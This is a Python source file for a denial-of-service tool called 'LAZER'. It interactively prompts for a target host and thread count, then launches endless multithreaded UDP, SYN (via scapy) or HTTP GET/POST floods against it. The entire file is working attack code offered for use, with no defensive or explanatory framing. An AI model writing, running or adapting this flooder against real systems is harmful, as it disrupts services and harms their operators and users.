import random
import time
from scapy.all import *
from colorama import *
import socket
import threading
import requests

init(autoreset = True)

print(ansi.clear_screen())
print(Fore.GREEN + '''
                 uuuuuuu
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$"   "$$$"   "$$$$$$u
       "$$$$"      u$u       $$$$"
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         "$$$$uu$$$   $$$uu$$$$"
          "$$$$$$$"   "$$$$$$$"
            u$$$$$$$u$$$$$$$u
             u$"$"$"$"$"$"$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
 """      ""$$$$$$$$$$$uu ""$"""
           uuuu ""$$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
  $$$$$$$$$$""""           ""$$$$$$$$$$$"
   "$$$$$"                      ""$$$$""
     $$$"                         $$$$"
''')
print(Fore.YELLOW + "----------------------------------------------")
print(Fore.YELLOW + "                    LAZER                     ")
print(Fore.YELLOW + "----------------------------------------------")

input(Fore.RED + "\nPress Enter To Continue...")

def udp():
    print(ansi.clear_screen())
    print(Fore.GREEN + "----------------------------------------------")
    print(Fore.GREEN + "                  UDP FLOOD                   ")
    print(Fore.GREEN + "----------------------------------------------\n")
    udp_target = str(input(Fore.YELLOW + "Enter Target's IP Address/Domain Name(e.g. example.com, 192.168.X.X ): "))
    udp_port = int(input(Fore.YELLOW + "Enter Target's Port: "))
    udp_message = str(input(Fore.YELLOW + "UDP Message(any string): "))
    udp_threads = int(input(Fore.YELLOW + "Threads: "))
    udp_speed = float(input(Fore.YELLOW + "Timeout After Sending Each Packet(in seconds, can be a decimal too): "))
    udp_verbose = str(input(Fore.YELLOW + "Verbose(y/N): "))
    input(Fore.RED + "\nPress Enter To Start Attack...")
    def udp_send_pkt():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            time.sleep(udp_speed)
            s.sendto(bytes(udp_message, "utf-8"), (udp_target, udp_port))
            if udp_verbose == "y":
                print(s)
            elif udp_verbose == "Y":
                print(s)
            
    threads = []
    for i in range(udp_threads):
        t = threading.Thread(target = udp_send_pkt)
        t.daemon = True
        threads.append(t)
            
    for i in range(udp_threads):
        threads[i].start()
                
    for i in range(udp_threads):
        threads[i].join()

def syn():
    print(ansi.clear_screen())
    print(Fore.GREEN + "----------------------------------------------")
    print(Fore.GREEN + "                  SYN FLOOD                   ")
    print(Fore.GREEN + "----------------------------------------------\n")
    hostname = socket.gethostname()
    ip_addr = socket.gethostbyname(hostname)
    sport = random.randint(1024, 65535)
    syn_target = str(input(Fore.YELLOW + "Enter Target's IP Address/Domain Name(e.g. example.com, 192.168.X.X ): "))
    syn_port = int(input(Fore.YELLOW + "Enter Target's Port: "))
    syn_threads = int(input(Fore.YELLOW + "Threads: "))
    syn_speed = float(input(Fore.YELLOW + "Timeout After Sending Each Packet(in seconds, can be a decimal too): "))
    syn_verbose = str(input(Fore.YELLOW + "Verbose(y/N): "))
    if syn_verbose == "y":
        syn_ver_final = "1"
    elif syn_verbose == "Y":
        syn_ver_final = "1"

    input(Fore.RED + "\nPress Enter To Start Attack...\nIgnore If You Get Warnings...")
    def send_syn_pkt():
        while True:
            time.sleep(syn_speed)
            a1 = IP(src = ip_addr, dst = syn_target)
            a2 = TCP(sport = sport, dport = syn_port)
            a3 = Raw(b"Lazer"*1024)
            send(a1/a2/a3, verbose=int(syn_ver_final))
    threads = []

    for i in range(syn_threads):
        t = threading.Thread(target = send_syn_pkt)
        t.daemon = True
        threads.append(t)

    for i in range(syn_threads):
        threads[i].start()

    for i in range(syn_threads):
        threads[i].join()

def http():
    print(ansi.clear_screen())
    print(Fore.GREEN + "----------------------------------------------")
    print(Fore.GREEN + "                  HTTP FLOOD                  ")
    print(Fore.GREEN + "----------------------------------------------\n")
    print(Fore.YELLOW + "Select HTTP Method:\n1) GET\n2) POST")
    def http_get():
        http_get_t = str(input(Fore.YELLOW + "Enter Target's IP Address/Domain Name(e.g. http://example.com, http://192.168.X.X): "))
        http_get_th = int(input(Fore.YELLOW + "Threads: "))
        http_get_s = float(input(Fore.YELLOW + "Timeout After Sending Each Request(in seconds, can be a decimal too): "))
        http_get_v = str(input("Verbose(y/N): "))
        input(Fore.RED + "\nPress Enter To Start Attack...")
        def send_http_get_req():
            while True:
                time.sleep(http_get_s)
                x = requests.get(http_get_t)
                if http_get_v == "y":
                    print(x)
                elif http_get_v == "Y":
                    print(x)
        threads = []
        for i in range(http_get_th):
            t = threading.Thread(target = send_http_get_req)
            t.daemon = True
            threads.append(t)
        for i in range(http_get_th):
            threads[i].start()
        for i in range(http_get_th):
            threads[i].join()

    def http_post():
        http_post_t = str(input(Fore.YELLOW + "Enter Target's IP Address/Domain Name(e.g. http://example.com, http://192.168.X.X): "))
        http_post_j = str(input("Add JSON: "))
        http_post_th = int(input(Fore.YELLOW + "Threads: "))
        http_post_s = float(input(Fore.YELLOW + "Timeout After Sending Each Request(in seconds, can be a decimal too): "))
        http_post_v = str(input("Verbose(y/N): "))
        input(Fore.RED + "\nPress Enter To Start Attack...")
        def send_http_post_req():
            while True:
                time.sleep(http_post_s)
                x = requests.post(http_post_t, json = http_post_j)
                if http_post_v == "y":
                    print(x)
                elif http_post_v == "Y":
                    print(x)
        threads = []
        for i in range(http_post_th):
            t = threading.Thread(target = send_http_post_req)
            t.daemon = True
            threads.append(t)
        for i in range(http_post_th):
            threads[i].start()
        for i in range(http_post_th):
            threads[i].join()
        
    while True:
        http_method = input(">> ")
        if http_method == "1":
            http_get()
            break
        elif http_method == "2":
            http_post()
            break
        else:
            print(Fore.RED + "Error: Invalid Option") 

print(ansi.clear_screen())
print(Fore.GREEN + "Choose Attack Type:\n")
print(Fore.YELLOW + "1) UDP FLOOD\n2) SYN FLOOD\n3) HTTP FLOOD\n")
while True:
    attack_type = input(">> ")
    if attack_type == "1":
        udp()
        break
    elif attack_type == "2":
        syn()
        break
    elif attack_type == "3":
        http()
        break
    else:
        print(Fore.RED + "Error: Invalid Option")